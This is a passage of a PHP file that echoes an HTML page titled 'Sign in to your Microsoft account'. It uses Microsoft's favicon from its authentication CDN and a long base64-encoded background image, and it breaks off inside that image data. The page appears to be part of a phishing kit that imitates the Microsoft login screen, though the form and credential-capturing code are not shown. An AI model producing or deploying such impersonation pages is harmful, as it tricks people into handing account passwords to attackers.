<?php
require_once 'hostname.php';

echo '<!DOCTYPE html>
<html lang="en">
<head>
 <title>Sign in to your Microsoft account</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <style>
    body{
    background-image: url(data:image/jpeg;base64,/9j/4QlQaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzE0MiA3OS4xNjA5MjQsIDIwMTcvMDcvMTMtMDE6MDY6MzkgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiLz4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3hwYWNrZXQgZW5kPSJ3Ij8+/+0ALFBob3Rvc2hvcCAzLjAAOEJJTQQlAAAAAAAQ1B2M2Y8AsgTpgAmY7PhCfv/bAIQACAYGBgYGCAYGCAwIBwgMDgoICAoOEA0NDg0NEBEMDg0NDgwRDxITFBMSDxgYGhoYGCMiIiIjJycnJycnJycnJwEJCAgJCgkLCQkLDgsNCw4RDg4ODhETDQ0ODQ0TGBEPDw8PERgWFxQUFBcWGhoYGBoaISEgISEnJycnJycnJycn/90ABAB4/+4ADkFkb2JlAGTAAAAAAf/AABEIBDgHgAMAIgABEQECEQH/xABVAAEBAQEAAAAAAAAAAAAAAAAAAQcCAQEBAQEAAAAAAAAAAAAAAAAAAQIDEAEBAQEBAAAAAAAAAAAAAAAAEQFBIREBAQAAAAAAAAAAAAAAAAAAABH/2gAMAwAAARECEQA/ANtAYdgAAAAQQAAAQFQAAAAQFQUEUBQAAAAAAAAAAQoKJUBSoAtEAWlQEUQBRAFQAUQBRFAAAAAAVAAAAABBRAFBFFEBFEUBUAUSrQAoIAAAAoAAAgAAAAAAAAAoAAAAFAAAARRARQUQBRKqAFBAKAAAAAAKAAIKggAAqAAAKIAqAAUBBUAAABFABEFAAAAAVBFAEUBAEAAEAAoCgAgAAACAAAICiAKIAogCiUAAAAAAQAAAFBUAWiAKIAoigAAAAAAAAAAogCiKAAAAAqAKIoAAAAAAAAAAAAKIqqAAAA//0NtAYdgABAQAABAAAAAAQAUBQAAAAAAQBRCoKiUUWoAAAAAAAAAAAAAKAAigiCoAACiKAAAAAAAAqACAACgKCKgAAigAAAAAAAKgCqgIogCiAKIoAAgAAAAAoAAAAIoCACAKAAAAAICKVFAKgC0QBarlQUTAFQoIAAAAAAAAAAACAAAACKAgAACAAAAAAqAAACAAAACAAAAIoCAAAAACAigAAAAgqIgAKVUAUQEUQBRAFEUAKUAAUAUAAFQBRAFAAAAAAAAVAFEUAAAABUAURQAAAAAAAAAAFQFUBR//0dtBGHZUBAAAQAAAAQAFAAFAABAFQEAqUAoAACgAAAgAAAAAFAAAAAAAAAAAAAAAARQFAAAAAAAAQAAVFUAAAAABAAAAAAAFEAAAAAAAAAAABFAAAAEAUBQAAAEAAAAAAABBFAEUBBUAAAAAAAUAAAAQRRAFEAFQAVAQVAAAAAABACgAAACoAAAAAIIKgAACKCCAAAAAAACAAAAKgAAgACAAAAAAAAAAAAAAAAC1AVRBRQAAAUQBRAFAAAAABRAFAAAAABRAFAAAAAAAAAAVAV//0tsAc3YAAQAAABAAFAAFAQFQEASgFAAAUAQFEEFEAUAAAAAAAAAAAAAAAAAAAAAAAFAEAFAAAAAAFAERQUAAAAABAAAAAABUAUAQAAAAAAAAUBAAAAEFQAFBFRRAAABQAAAAAAAEAAAAEUAAAAAAAAAABABAAAAAAQAAABAAAAAAAAAAAEQBAUQBaIAogCpRAURRAKUAAAABFQABAAUARBRFAEBFAAAAAAAAAAAAAAAAAAABRAFEFVRFoKgAoICgAAAAAKgCiKAAAqAKIoAAAAAAAAP/09sAc3YQAAAEABQFAAQVAAKgIAAI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FAABUAVAAAEURQVUAABABQAAAABQAVQAEAQAAQAAAUFRQAEFAEAAAFARQAAFQBRBRQBBUVAABAFQVABQEAAAAAAAAAAAAAAAAAEFAEAQFBAVABUAARQKIAAAACAAAAAAAAAAAoggGiCAoAIAAoAIgAAAAAAIIogigAAAgioAAAAAAAAgAAIAAAAAAAAAKIAqLQEFQAAFEUAAAAFoi1UAUEAFAAAAFxAHQAAAAAACgACgIACigoIAK//Q2kBh2AAAEAAEAARQVAAQVAAAAAVAFEVEAAAAAAAAAAAEAAAAEAAAAFABUAUAABUAAAAAAUBQUBAABAAAEAFAABQAUEQAAAUEVAABBUAUQBQFFEVAVAFEVUEAAUAAEAAAAAABAFEAUEBQAAEAAAAQABUAAABFQAAAAAAAAAAQAAFAAABBBU0AQBUAAAEUAAABABAEBRAAAABAAAAAAEQAAAAAABAABBUAAAAAAAAAAAAAVFARQEABRFAAUAAVXKgoAIKAgoCCgpTABQBAAAFBAFFEAdAIoAqKgoP/0dpAYdQAUAABAAEUAARUEAAEUBABRFQABFAAAAAAAAAAEAAAQAABQRQABQRQUABAAAAAQUUABQoiiAAAAAgAoAAAoACCgCACggAACAAAAAACoqgACoKAUqAogIqoAqAIAAKgAAAAAAAACiKAAiAAAAAAAAAACKAgAAAAACooiCgAAAFAQAAAEUBAAABABAAFEAAAQRQEAAAAAAAQAQFQBABARQEUQFEAVAEABVEAAUEFQAAAAAAAAFDAQRQVFAAAABQVAFxUUABAAAAFAFFEWiAAAAKAogoCiAqgICoKP//S2oBh1QUBBQERUFAAAAEVEAAAAAABFQEFBUFAQUCoqAVUFFQVEQABFAAFBBQABQAAAEAABAFQFBUUQAAAAABRFAAVAAAAFAAUEQAUBAAAQAAAAAABVAAAAAAAAAFEAAABAAAAAAAAAAAABQEAAAAAEABQAQAAAAAAQUBBUBQBAQAAAAAAAAAAARQEFQQFRARQVAAABAAAAEFQABABAAAAEAAQAAABBUEAAAAEUAAFURQQUBBQEFQAAAAFEUAAQAFFAABQAFUBEAAABQUBBRQBQQUERQAAVQAFAQAAf//T2oBh1AAAARFQAAUAARQEFRAAAAARUAAAAAAAAAAAAAAFAAAAABAAAEBRAFQFAAAFEAAAAAAAFBQRAAABQABRFBRFEBAAAQAAAAAAAUFAAAAAAAAARQAAAABAAAAAAAAAABQAAEAAAAAAAAAAAAAAAEAEABRBFQAAAAAAAAAAABABAFxFUEBEABQAEFBEFQAABFQABEEVAABQBAAAAEAQFQAABAAAABFARRAdCKKAAIoCKACKAi4IDoRQAAAAURQQVBRcQBQAAAURQAACgooiiAAAAoAAqKAAD//U2oBh1AAAAcgAAAAAAAACgACKgCKiAAAAAAAAAAAAAAAIAogCiAKgKAAAAAAgoAAAAAAAAKCgIAIACoAAAALiAKIAoAgAAAAAoAAKigAAAAAAAAKAgAAAIAAAAAAAAAAKigACAAAAAAAAAAAAAAACAAACAKIAAAAIAAAAAAAIAAIAoAIgAAAKAAAACAgACAIAACKAgAACAAIAAgAACAAAAAAoACACAAKogooAAAACAACKCigAAAKigAAAAACgACoAoCgACiKAAIACgAAAKAD/1dqAZdAAURUoIAAAgAAAAAAAAAlARUFAUEFAQBAAAAUEVAAAAAAAAAABAAAUAAAAAAAAUAABQQAEAAAAAAAAAAAFFEUABEAFAABUUAAAAAAAAAFEAAABAAAAAAAAAAAFAAEAAAAAAAAAAAAAAAAAEAAAABFAQAAAAAQAABQAEENNQABQAEAEAAUAARUBABFQAAAAEAAEAAAQABAAABBBUAAAAARQAAAAAAAAFEVQAAAAAQAAURVAAAAFAAAAAAAFAAUAAABcRVAFEQAUBQQVAFAH/9bagGXQAAcukBAAABQBAAAAAAATVTQQAAAAAFEAUQFVABBUAAEAAAABQEFAAAAAAFAAAAQAAUAABAAAAAAAAABQAAAABRAAAAAAAAFEUAAAAQAAUBAAAAAAAAABQAAABQEQAAAAAAAAAAAAAAAAAAAAAQAAAAQUARQEUBAAAAABBEVFAAAAABEABQABFQEFBEAAAQAAAAQAABAAAAEEBAAUARBQAAAAAFRQAAEUAAAAAAUAVARUABQAFAADFRQAAAAABQABUUAAAAFxUVQRUAABQBQAH//X2oBlsAAQAABRFAQVAQUAEEFEBRFAQAAAAAAAAABFAQUBBQEUAAAAAAFAAAAQAAAABQRQEAAAAAAAAAFAAAAAAAAQUBAAAAABQAAAAAQVABQBFBAUQBRFAAUBFAAAAAUQFEVEAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAA0EoAIAAAAAgAAACAACKiKAAAKgiiCCgIACCoAAgAAAAgAgAgAAAACgIKgCgAAKAAAAAAAAKigAAAAAAAAKigCiiCgIoAAAAAACgACooigKAAAAAAr//Q2oBlsABAAAAAAEAUAAAAABBUAAAAAAAAARUAAFABAAAAAAAAAAAAAAAFBFAQAAAAAAAAAUAAAAABAAAABQEAAAFAAAAAAAAAAAFRAAABQABRAFQAFQBRAFAAABRBEUQUUQQFRQAAAAAAAAAAAAAAAAAAAEAAAAAUEAATUVAAAAAQUBBQBBUBFAEBAQABQEAAAEAAQABFAQBAAAAARRBABAABQAAAAAAFAAAAAAAAAAAUAAAAAAAABUUFEVQAAAAAAAAVFARQVFxFBRFVAAAFBBUFf//R2oBGwAEAQAAAAQBVAAAAAEBAAAAAAAAAAQAAAAAAAAAAAAAAABQAAQAAAAAAAUAAAAAABARUAFRQAABQEAFAAAAAAAAAAAAAFEAAAAAAAAAAAAAAAAFRQFQEABQAQBUAAAAAAAAAAAAAAAAAAAAABABQABAAAAE1FqCgAACIAAAAAAACIKiKAAAAIoAigIKgIKggAgIoCCoAAAAgAAAAAAAAAAAAAAAAAAAAAAKigAAAAAAAAKiguAAAKAAAAAACoooAAAAqKIAKCooCKCv/0tqARsABAAAAAAQBFAFAABFRAAEAAAAAAEqoKAAAAAABAAUBBQQAAAAAABKCiCgAAAIUAAAAAAAAAFQVQAEFAAAAAAAAAAAAAAAAAQUAAAAAAAAAAAAAAAAUAAAAAAABEFAAAAAAAAAAAAAAAAAAAAAABEFAAEAVABFQUAQAAAAABAUBBQEFARFEEAAAAAAAAABEdIgIoIgAAAIKgACAAAAAAAAAAAAAAAAACggqAAAKigAAAAKigIoCCgGKYAAAAKAAAAoCgAAAAKigACACigIP/9PagEaAAQAAAAAABFEUARQERUUAAAAAAAAAEAAAAAAAAAAABQCoCoAAAgAAAAAAAAAAAAAAAqAACoAoACoAoAAAAAAAAAACgAiKAAAAAAAAAAAAAAAACgAAAAAAACCoqAAAAAAAAAAAAAAAAAAAAACiACAAAigAAIi6gACKACAACgAAAAAAghq6gIoAgqAAAAAAAIqIAACKAgsQQRQEAQAAAAAABQEFAQUBAAAUAAUAAAABQAAQUEBFFAAAAUAQFAQVFAUFQUBBQAFBBQEVFAAEAFFAQf/U2oBGgAEAAAAAAAFAAAARFQAAAAAAAAAQEFQBRAFEAUQBRAAAAAAAABQAQAAAAAFQAAAAAAAAAAAAAAABVQBRABQAAUAAAEBQEAAAAAAAAAAAAAAAAFAAAAAAAAFRAAAAAAAAAAAAAAAAAAAAAFEAAAEAAAABFAQAEBUAAAAAAAAAAABARQEFAcgAAAAAAAAICKAgAACBEUBBQEBQQAQAFAAAAAAAABQAAEFAQABUUAAAAAUBAAAAVUxRAAEFAABQBQAAVFAAAABUUBBUBQAf/9XagEaAAQAAABFQBUFFEEFSiAACgAAAACgCIgAAAAAAAAAAAAAoACAAAAAAAAAAAAAAAAAAAAAAAAACgAAqKAAAAAoAAAKiogAAAAAAAAAAAAAAAAoAAAAAAAAogAgAAAAAAAAAAAAAAAAAACggAAAAAgIoAACAAgoAAgAAAAAAAAAIAAAAAAIKgILqAAAAAAIAACKAgCAAAAAAAAAAAigIKgAACooAAAAAAAAAAAAAAKAgIqKAAOhFAAAAAAAAFAFBQAAAAEUAAAAAH//W2oAUBEUAAAARRRBQRBQEAFQUBBQEFARHSAgAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAoAAAAAAACAAAACoAogCiKCiKgoigAAAAAAAAAAAAAAKAAAAAAAAAgoAAAAAAAAAAIAAAAAAAAAKIAAAAAIAAAAAACKAgCAAAAAAAAAAAAgAAAAAAAAIAIAAAAAgAAAAIqIAAAAAAAAAAAAoAAAIAAAIAAAAAsAEUBAFBUUFAQEVAEUUUAAAAAAAAAAAVQFAAAAFAEAAAAf/9fagBRFQUAAAAAEAAAAEVAAAAAAAEEFAAAAAAAAAAABAAAAAAAAAAAAABYAAAAAAgAAAAAAAAAAAAAAAAAACgACCooAACoAogKoigAIAAAAAKAAAAAAAAIAoAAAAAAAAAAACAAAAAAAAAoCACAAAAAAAAAAKAiIAAAAAAAAAAAAAIAAAAAAAAAAIKIORQEAAAACCCCoAAAAKAAAoiCwBBQABBBQEFQAAUAAXEBFVIoIKgAAoqAKAIAAigAAqgAgAAAAAAACgCgCgACgCAACooP/0NqAFEAAAUAAAEAAAAQAAAAAAEAQBQAAAAAAAQAAAAAWAAAAAAIAAAAAAAAAACAKIAogCgAAAAAACAAoAACgigIAAKigAAAAAAoigCAKAKAoAAgAAAAAgAoAAAAAAAAAAAAAAAAACAAAqKIAAAIAAAAAAoAAAAAgigAAAioIAAAAAAAIAAAAACAAAAAACCgORYChBURAAIkUBBUFICggsICCwiCRYAAAAACKAgqAgoCCgAKIAAIqAACigAAIAAAKAAoAACgAAgoCKAgAKAAAKLiooCKCIoA//9HagBUAAAAAAAAAUAAQEQURQAAEBRAAoKBUFBKgqAAAAAAAAAAAAgKIAqAAAAAAAAAAAAACgKAAgAAAAAAAACgigACgAAAAAAAAAAAAAoACAoAAAAAAAAoACAAAAAAAAAAAAAAAAAAgAAKAgAgACgAAAAAAAACAAAAAAAioICoCggKgAAqCCoAAgAAACgAgAAAAAgAAAAAgAAAAoAAAgAAAAAAAAgoCAAKAAAAAAAAAAAAAAAAKCCooAAKigAAAAAAKAIKAgKCgKAAAKD//0tqAVUAAAAAAAAAARUAAEAAAAQAAAAAAABBAUQBRAAAAAAAAAAAAAAAQAUAAAAAAAAUQBQAAAAAAAAUAAAAQAAVAFEBVAAAAAAAAABQEAABQAAAABQAAEAAAAAAAAAAAAAAAAABBQBABFAAAAAAAAAAAAAEAAAAAAAABFAAAEUQAAEUBFBBBQEUBBFAQAABFAAAAAAAAQUBBQEFRAAAAAAAAAAAABFAAAAAAAAAFAARQEFAQUAAAAAAAAUAAAAAAUAAAEXABQAAFAFB//9PagFEAAAAAAAAEUBAAEAUQBRAAAAAAABFQBAAAUAAAAAAABAAAAAAAAAAAAAAQAAAAAAABRAFAFAAUAAAQAAAAAAAAVAFEAUAUAAAQUAAAAAFAAVFAAQAAAAAAAAAAAAAAAAAEBQEAAAEUAAAAAAAAAAAAAQAAAAAAAAAEAAAAAAABAAAAAAAAAAQEUBAAAAAAAAAAAAEUQQFBBQEAAAAAQAUABQRQEFAQAAUAAFAAAAAAAAAAAAAVUQAAABUUAAAAAFzAAAAAFRVH/9TagFEFQAAAAEAAAAABAAAAAAAAAAAAENFEAAFAQUAABABKAKAAAAgAAAAAAAAAAAAAAAAAAAAACoAKqKgAACgIKAgqAAAAAAAoigAAAIKAKAAAAoAigCgCAAAAAAAAAAAAAAAAAqKiAAAAoAgAAAAAAAAAAAAAIAAAoKgAAKCKioCKCIKgAAACACggAAAACAAAAAAAAAigqAIAAAAAAACAAAAAAAAAAAAAAoAIAAAAAAACgAAAAAAAAqKAAAiiiCoAoAACAACooKigIAAqKo//1dqAUEVFAAAAEAQAAEUUQUBBQBFQQAAAARUgAAoAIAKAACAAAIAAAAAAAAAAACAAAAAAAAAAAAAAoAAAAqKCiKgAAoigAAAAAAAAAAAAAAqAgKACooAAKAAAigAAAAAAAAAAAAAACCgCAAAAACKAAAAAAAAAAAIAKKigCCgIoAAIAAgAAAAiiCKACKAgAAAACAAAAAAAAAioKCiCAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAALAEWCiAAAAKAAqAAAAKAAAAAACiiAACKCooCP/W2oBUEVFAAAAEFBUUAQAAAAAEAEAAAAARQAAAAAAAEQAAAAAQAAAABBQAAAAAFEKCiFEUAAAAAAAAAAAAAVRFBQEAAFEUAAAAAAAAAAAABUUAFAAQFQBQAAAAEUAAAAAAAAAAAAUEQAAAAAAARQAAAAAAAAVAAVFAAAAAAABABAAAAAAAAQAAAEABRBRBBUAAAFBUFQQAFAEAAEFAEUgIKAgoCCgIAgAAAAAAAAAAAoAQBAAAAAAVUUBFRQRQEFAAUAABFAQAAUBAFAAFVFAAAAAAEf/X2oBpBFAQAAAAEBRAAAAQBUAAAABQAARUAAAEBFQAAAABAAAAAEoKlAUBFFEAUQBUARRAFEAUqKCiKAAAAgAAAAAALiKCgCgAAKAAAAgAAAAAAKgAqKAoAAIKAAAAAAAigAAAAAAAAAAKIAIAAAAAAoAgAAAAAAKAAAoAgAAAAAAAIgAAAAAAAgAAAAAIAAAAAAoAgAAAAigAigCKAQBAAAAVUFRAAAAAABBQEFAQVAFRcBQAEUBAAQUBAUFwMBAAEAVQAFAEAAAAAAAAAAQUUMUAAAAAAAf/0NqAaQNAEAAAAAAAARSA5FQQUAQBVAAAQQBAAAAAAAABAAAAAAEogoAAAAAAAAAAAAKgCiKAACiKAAAAAAACgiggAAoYCioAoAAAAAAAACAAACgoACgAAgAAAAAAAIoAAAAAAAAqKIAIAAAAoAAAgAAAAKAAAACKAAAAAAACACAAAAAAAAgAAAqKgoCKAAAIoIAAAAIAAAgAAAAAAAAACiKAIoCAAAAAAAAAAKAACAACCooAAKigACAACKCoKAAKgAAAACgIqAAAAAoKCCooAAAA/9HagGkAAQAAAAgAACBomgAKAACK5AAAFAQEAAAAAFRQARAAABQQQAAAAABQAAAAAAAAFBABAAFURQAAAAFRQAAAAAAFAFEUUAQAAAAAAAAAVAFAFAAAAAAAABAAAARQAAAAAAFEAAAEAAAAUAAAQAAAUAAAAUAQAAAAABAAABAAAAAFEEBRQBAAAAAAAAQAAAABAABAAAAAAAAAAFAAAEABQRUAAQAAAUEUABQEAAAAAUQVAUAAAAAAAAAABQAAAEFAAAEAAPRQFAABQRQEFAf/0tqFRpAAEFAQARUAABQABAAAAEVAARRUAQRRFRQUAAEAQAAAABANQAAABUUABAAAAQAFAUEUAAAAAFQBQBQABQQAAAAAUAABUUABAAAAFAABQAFRBUUUAAAAAAAAAQAAAEUAAAAAEUAAAABAAAAFAAAEAFAAAAAAFAEAAAAAAABEAAAAUBFAAAAAEAAAAAAABAAAAAQAAEAUFQUAABBQABAABBQEAAAFAAQUAABQBAAAAAAEFAQFBFABFAQVAAVRBQEAUAAAAUBEAAEVFBUUVQAABABQAB//09r